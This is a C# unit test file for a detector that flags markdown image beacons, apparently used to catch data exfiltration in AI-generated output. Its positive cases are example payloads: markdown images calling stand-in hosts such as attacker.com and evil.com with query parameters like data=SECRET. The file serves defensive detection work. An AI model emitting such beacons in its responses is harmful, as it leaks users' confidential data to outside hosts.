using Nephron.Detectors;
using Xunit;

namespace Nephron.Tests.Detectors;

public sealed class Markdown_Image_Beacon_Detector_Tests
{
	private readonly MarkdownImageBeaconDetector _Detector = new();

	[Fact]
	public void Detects_Suspicious_Markdown_Image_Beacons()
	{
		Detector_Test_Helpers.Assert_Detects_All(
			_Detector,
			// [MALICIOUS]
			"Check this: ![alt](https://attacker.com/log?data=SECRET)",
			// [MALICIOUS]
			"![img](http://192.168.1.1/exfil)",
			// [MALICIOUS]
			"![image](https://[2001:db8::1]/data)",
			// [MALICIOUS]
			"See: ![](https://evil.com?data=confidential)",
			// [MALICIOUS]
			"![](HTTPS://ATTACKER.COM?KEY=VALUE)");
	}

	[Fact]
	public void Allows_Clean_Markdown_And_Links()
	{
		Detector_Test_Helpers.Assert_Allows_All(
			_Detector,
			"![alt text](https://example.com/image.png)",
			"![pic](https://trusted-domain.com/assets/photo.jpg)",
			"[link](https://example.com?param=value)",
			"",
			"No markdown image here");
	}

	[Fact]
	public void Reports_Expected_Metadata()
	{
		var detections = Detector_Test_Helpers.Detect(_Detector, "Check this: ![alt](https://attacker.com/log?data=SECRET)");
		Assert.NotEmpty(detections);
		Assert.Equal("output.markdown_image_beacon", detections[0].DetectorId);
		Assert.Equal(DetectionCategory.ExfiltrationBeacon, detections[0].Category);
		Assert.Equal(Severity.High, detections[0].Severity);
	}
}
